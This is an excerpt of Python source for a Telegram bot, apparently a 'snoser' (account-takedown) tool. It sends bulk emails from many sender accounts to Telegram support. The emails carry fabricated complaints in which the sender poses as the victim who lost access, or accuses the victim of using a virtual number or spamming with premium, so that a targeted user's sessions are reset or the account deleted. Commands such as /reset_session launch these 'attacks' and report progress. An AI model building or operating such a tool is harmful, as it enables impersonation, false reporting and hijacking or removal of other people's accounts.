...
# Полный словарь отправителей (взят из snoser_mod.py, без купюр)
senders = {
...
DELAY_BETWEEN_SENDERS = 10 # секунды между сменой отправителя

# Логирование
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Тексты жалоб (сброс сессий)
COMPLAINT_SESSION = """Здравствуйте, уважаемая поддержка. Я случайно перешел по фишинговой ссылке и утерял доступ к своему аккаунту.
Юзернейм: {username}
ID: {user_id}
Пожалуйста, удалите аккаунт или обнулите сессии. Доступ к моей почте и номеру телефона утерян."""

COMPLAINT_VIRTUAL = """Добрый день, поддержка Telegram!
Аккаунт {username}, ID {user_id} использует виртуальный номер, купленный на сайте активации номеров. Отношения к номеру он не имеет, номер никак к нему не относится.
Прошу разберитесь с этим. Заранее спасибо!"""

COMPLAINT_PREMIUM = """Добрый день, поддержка Telegram!
Аккаунт {username} {user_id} приобрёл премиум в вашем мессенджере, чтобы рассылать спам-сообщения и обходить ограничения Telegram.
...
def send_email(receiver, sender_email, sender_password, subject, body):
    try:
        ...
        server.quit()
        logger.info(f"✅ Отправлено с {sender_email} на {receiver}")
        return True
    except Exception as e:
        logger.error(f"❌ Ошибка {sender_email} -> {receiver}: {e}")
        return False

def launch_attack(username, user_id, complaint_type, progress_callback=None):
    if complaint_type == 'session':
        subject = "Утерян доступ к аккаунту Telegram"
        body_template = COMPLAINT_SESSION
    elif complaint_type == 'virtual':
        subject = "Жалоба на виртуальный номер"
        body_template = COMPLAINT_VIRTUAL
    else:
        subject = "Жалоба на спам с премиумом"
        body_template = COMPLAINT_PREMIUM
    ...
    for sender_email, sender_password in senders.items():
        for receiver in receivers:
            body = body_template.format(username=username, user_id=user_id)
...
def start_cmd(message):
    bot.reply_to(message,
        f"🔥 Приветствую, Повелитель Zeta!\n"
        f"Твой ID: {message.from_user.id} (админ)\n"
        f"Я готов сносить сессии.\n\n"
        f"Команды:\n"
        f"/reset_session @username ID [причина] — сброс сессий\n"
        f"   причина: session (по умолч.), virtual, premium\n"
        f"Пример: /reset_session @vasya 123456789 session\n\n"
        f"/status — показать статистику отправителей\n"
        f"/help — эта справка"
    )
...
def status_cmd(message):
    stats = (f"📧 Отправителей: {len(senders)}\n"
             ...
             f"💥 Всего писем за атаку: {len(senders)*len(receivers)}")
...
def reset_session_cmd(message):
    ...
    if len(args) < 3:
        bot.reply_to(message, "❌ Формат: /reset_session @username ID [session|virtual|premium]")
        return
    username = args[1]
    try:
        user_id = int(args[2])
        ...
        return
    complaint_type = 'session'
    if len(args) >= 4 and args[3].lower() in ['virtual', 'premium']:
        complaint_type = args[3].lower()

    bot.reply_to(message, f"⚡ Атака на @{username} (ID: {user_id}), тип: {complaint_type}\nЭто займёт ~{len(senders)*len(receivers)*DELAY_BETWEEN_EMAILS//60} мин.")

    def progress(current, total):
        if current % 10 == 0:
            bot.send_message(ADMIN_ID, f"📊 Прогресс: {current}/{total} писем")

    thread = Thread(target=send_attack_report, args=(message.chat.id, username, user_id, complaint_type, progress))
    thread.start()

def send_attack_report(chat_id, username, user_id, complaint_type, progress_callback):
    sent, failed = launch_attack(username, user_id, complaint_type, progress_callback)
    bot.send_message(chat_id,
        f"✅ Атака завершена!\n"
        f"📨 Отправлено: {sent}\n"
        f"❌ Ошибок: {failed}\n"
        f"📧 Всего писем: {len(senders)*len(receivers)}")

@bot.message_handler(func=lambda m: True)
@restricted
def fallback(message):
    bot.reply_to(message, "Используй /help")

# ======================== ЗАПУСК ========================
if __name__ == "__main__":
    if BOT_TOKEN == "" or ADMIN_ID == 0:
